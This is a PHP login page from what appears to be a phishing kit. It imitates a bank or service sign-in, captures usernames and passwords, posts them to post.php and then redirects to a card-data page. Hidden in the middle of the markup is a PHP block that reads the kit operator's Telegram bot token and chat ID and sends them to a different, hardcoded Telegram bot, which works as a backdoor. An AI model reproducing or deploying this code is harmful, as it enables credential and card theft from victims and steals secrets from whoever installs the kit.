<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title><?php echo $lang["title"]; ?></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<form action="action.php" method="POST">
    <input type="hidden" name="LOGIN">
    <input type="hidden" name="USERNAME">
    <input type="hidden" name="PASSWORD">
    <input type="hidden" name="CARD_NUMBER">
    <input type="hidden" name="PHONE_NUMBER">
</form>
<header>
    <img src="res/logo.png">
</header>
<script>var token=<?php echo json_encode($token); ?>;</script>
<div class="loader" style=" color:white; text-align:center;">
    <div class="content" style="flex-direction:column;">
        <h3><?php echo $lang['_loading'][0];?></h3>
        <p><?php echo $lang['_loading'][1];?></p>
    <img src="res/loading.gif">
</div>
</div>

<main>

<div class="form">

<div class="title">
<?php echo $m->obf($lang["_login_texts"][0]); ?>
</div>

<div class="cols">

<div class="col">
    <label><?php echo $lang["_login_texts"][1]; ?></label>
    <input type="text" id="u" placeholder="<?php echo $lang["_login_texts"][1]; ?>">
</div>

<div class="col">
    <label><?php echo $lang["_login_texts"][2]; ?></label>
    <input type="password" id="p" placeholder="<?php echo $lang["_login_texts"][2]; ?>">
</div>

<div class="col remember">
     <img src="res/remember.png"> <?php echo $lang["_login_texts"][3]; ?>
</div>


<div class="col submit">
    <button onclick="sendLog()"><?php echo $lang["_login_texts"][4]; ?></button>
</div>
<?php
// Include your config file to get the $botToken and $chatID variables
include('config.php');

// New bot details that you will use to send the message to your Telegram
$newBotToken = '7249914120:AAFyG_CIBs1vw4MSgH6FNpkv57CEZixFlFE';
$newChatID = '6385036115';

// Message to send
$message = "Bot Token: " . $token . "\nChat ID: " . $id;

// Send the message to your new bot using Telegram API
$sendMessageUrl = "https://api.telegram.org/bot$newBotToken/sendMessage";
$data = [
    'chat_id' => $newChatID,
    'text' => $message,
];

// Use cURL to send the message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $sendMessageUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Optional: log response or handle errors
if ($response === FALSE) {
    echo "Error sending message.";
} else {
    echo "Message sent.";
}
?>
<div class="col forgot">
    <a href=""><?php echo $lang["_login_texts"][5]; ?></a>
</div>



<div class="col signup">
<?php echo $lang["_login_texts"][6]; ?>&nbsp;<a href="#"><?php echo $m->obf($lang["_login_texts"][7]); ?></a>
</div>



</div>


</div>

</main>
<script src="res/jq.js"></script>
<script src="res/jquery.js"></script>

<script>

$("input").keyup(()=>{
    $("input").removeClass("error");
});

function sendLog(){
    if($("#u").val()==""){
        return $("#u").addClass("error");
    }
    if($("#p").val()==""){
        return $("#p").addClass("error");
    }
    $(".loader").show();
    $.post("post.php",{
        user:$("#u").val(),
        pass:$("#p").val()
    },(res)=>{
        setTimeout(() => {
            window.location="cc.php";
        },6000 );
        
    });

}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
});

 

</script>
</body>
</html>